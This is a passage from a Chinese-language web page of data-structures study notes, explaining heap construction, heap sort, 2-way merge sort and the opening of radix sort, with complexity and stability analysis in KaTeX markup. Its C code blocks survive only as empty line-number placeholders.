class="mord">1</span></span></span></span>）为根的子树进行筛选，看该结点值是否大于其左右子结点的值，若不大于，则将左右子结点中的较大值与之交换，交换后可能会破坏下一级的堆，于是继续采用上述方法构造下一级的堆，直到以该结点为根的子树构成堆为止。反复利用上述调整堆的方法建堆，直到根结点。</p>
<p>下面是建立大根堆的算法：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>调整的时间与树高有关，为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span>。在建含 <code>n</code> 个元素的堆时，关键字的比较总次数不超过 <code>4n</code>，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，这说明可以在线性时间内将一个无序数组建成一个堆。</p>
<p>下面是堆排序算法：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>同时，堆也支持插入操作。对堆进行插入操作时，先将新结点放在堆的末端，再对这个新结点向上执行调整操作。</p>
<p>堆排序适合关键字较多的情况。例如：在 <code>1</code> 亿个数中选出前 <code>100</code> 个最大值。首先使用一个大小为 <code>100</code> 的数组，读入前 <code>100</code> 个数，建立小顶堆，而后依次读入余下的数，若小于堆顶则舍弃，否则用该数取代堆顶并重新调整堆，待数据读取完毕，堆中 <code>100</code> 个数即为所求。</p>
<p>堆排序算法的 <strong>性能分析如下：</strong></p>
<ul>
<li><strong>空间效率</strong>：仅使用了常数个辅助单元，所以空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li><strong>时间效率</strong>：建堆时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，之后有 <code>n - 1</code> 次向下调整操作，每次调整的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span>，故在最好、最坏和平均情况下，堆排序的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
<li><strong>稳定性</strong>：进行筛选时，有可能把后面相同关键字的元素调整到前面，所以堆排序算法是一种不稳定的排序方法。例如：表 L = {1, <strong>2</strong>, 2}，构造初始堆时可能将 <strong>2</strong> 交换到堆顶，此时 L = {<strong>2</strong>, 1, 2}，最终排序序列为 L = {1, 2, <strong>2</strong>}，显然，2 与 <strong>2</strong> 的相对次序已发生变化。</li>
</ul>
<h3> 归并排序和基数排序</h3>
<h4> 归并排序</h4>
<p>归并排序与上述基于交换、选择等排序的思想不一样，“归并” 的含义是将两个或两个以上的有序表合并成一个新的有序表。假定待排序表含有 <code>n</code> 个记录，则可将其视为 <code>n</code> 个有序的子表，每个子表的长度为 <code>1</code>，然后两两归并，得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil n / 2 \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">n</span><span class="mord">/2</span><span class="mclose">⌉</span></span></span></span> 个长度为 <code>2</code> 或 <code>1</code> 的有序表；继续两两归并……如此重复，直到合并成一个长度为 <code>n</code> 的有序表为止，这种排序方法称为 <strong>2 路归并排序。</strong></p>
<p><code>Merge()</code> 的功能是将前后相邻的两个有序表归并为一个有序表。设两段有序表 <code>A[low...mid]</code>、<code>A[mid + 1...high]</code> 存放在同一顺序表中的相邻位置，先将它们复制到辅助数组 <code>B</code> 中。每次从对应 <code>B</code> 中的两个段取出一个记录进行关键字的比较，将较小者放入 <code>A</code> 中，当数组 <code>B</code> 中有一段的下标超出其对应的表长（即该段的所有元素都已复制到 <code>A</code> 中）时，将另一段中的剩余部分直接复制到 <code>A</code> 中。算法如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>上面的代码中，最后两个 <code>while</code> 循环只有一个会执行</p>
</div>
<p>一趟归并排序的操作是，调用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mi>h</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil n / 2h \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">n</span><span class="mord">/2</span><span class="mord mathnormal">h</span><span class="mclose">⌉</span></span></span></span> 次算法 <code>merge()</code>，将 <code>L[1...n]</code> 中前后相邻且长度为 <code>h</code> 的有序段进行两两归并，得到前后相邻、长度为 <code>2h</code> 的有序段，整个归并排序需要进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_{2} n \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">⌉</span></span></span></span> 趟。</p>
<p>递归形式的 2 路归并排序算法是基于分治的，其过程如下：</p>
<ul>
<li><strong>分解</strong>：将含有 <code>n</code> 个元素的待排序表分成各含 <code>n / 2</code> 个元素的子表，采用 2 路归并排序算法对两个子表递归地进行排序</li>
<li><strong>合并</strong>：合并两个已排序的子表得到排序结果</li>
</ul>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2 路归并排序算法的 <strong>性能分析如下：</strong></p>
<ul>
<li><strong>空间效率</strong>：<code>Merge()</code> 操作中，辅助空间刚好为 <code>n</code> 个单元，所以算法的空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
<li><strong>时间效率</strong>：每趟归并的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，共需进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_{2} n \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">⌉</span></span></span></span> 趟归并，所以算法的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
<li><strong>稳定性</strong>：由于 <code>Merge()</code> 操作不会改变相同关键字记录的相对次序，所以 2 路归并排序算法是一种稳定的排序方法</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>一般而言，对于 <code>N</code> 个元素进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 路归并排序时，排序的趟数 <code>m</code> 满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mi>m</mi></msup><mo>=</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">k^{m} = N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>，从而 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>k</mi></msub><mi>N</mi></mrow><annotation encoding="application/x-tex">m = log_{k} N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>，又考虑到 <code>m</code> 为整数，所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>k</mi></msub><mi>N</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">m = \lceil log_{k} N \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">⌉</span></span></span></span>。这和前面的 2 路归并是一致的</p>
</div>
<h4> 基数排序</h4>
<p>基数排序是一种很特别的排序方法，它不基于比较和移动进行排序，而基于关键字各位的大小进行排序。基数排序是一种借助多关键字排序的思想对单逻辑关键字进行排序的方法。</p>
<p>假设长度为 <code>n</code> 的线性表中每个结点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">a_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的关键字由 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span> 元组（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>k</mi><mi>j</mi><mrow><mi>d</mi><mo>−</mo><mn>1</mn></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>k</mi><mi>j</mi><mrow><mi>d</mi><mo>−</mo><mn>2</mn></mrow></msubsup><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msubsup><mi>k</mi><mi>j</mi><mn>1</mn></msubsup><mo separator="true">,</mo><msubsup><mi>k</mi><mi>j</mi><mn>0</mn></msubsup></mrow><annotation encoding="application/x-tex">k_{j}^{d-1}, k_{j}^{d-2}, \dotsc, k_{j}^{1}, k_{j}^{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3022em;vertical-align:-0.413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8892em;"><span style="top:-2.4231em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.1031em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8892em;"><span style="top:-2.4231em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.1031em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.4413em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.4413em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span></span></span></span>）组成，满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>⩽</mo><msubsup><mi>k</mi><mi>j</mi><mi>i</mi></msubsup></mrow><annotation encoding="application/x-tex">0 \leqslant k_{j}^{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2194em;vertical-align:-0.3948em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-2.4413em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span></span></span></span>。其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>k</mi><mi>j</mi><mrow><mi>d</mi><mo>−</mo><mn>1</mn></mrow></msubsup></mrow><annotation encoding="application/x-tex">k_{j}^{d-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3022em;vertical-align:-0.413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8892em;"><span style="top:-2.4231em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.1031em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span></span></span></span></span></span></span></span></span></span> 为最主位关键字，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>k</mi><mi>j</mi><mn>0</mn></msubsup></mrow><annotation encoding="application/x-tex">k_{j}^{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2089em;vertical-align:-0.3948em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.4413em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span></span></span></span> 为最次位关键字。</p>
<p>为实现多关键字排序，通常有两种方法：第一种是 <strong>最高位优先（MSD）法</strong>，按关键字位权重递减依次逐层划分成若干更小的子序列，最后将所有子序列依次连接成一个有序序列。第二种是 <strong>最低位优先（LSD）法</strong>，按关键字位权重递增依次进行排序，最后形成一个有序序列。</p>
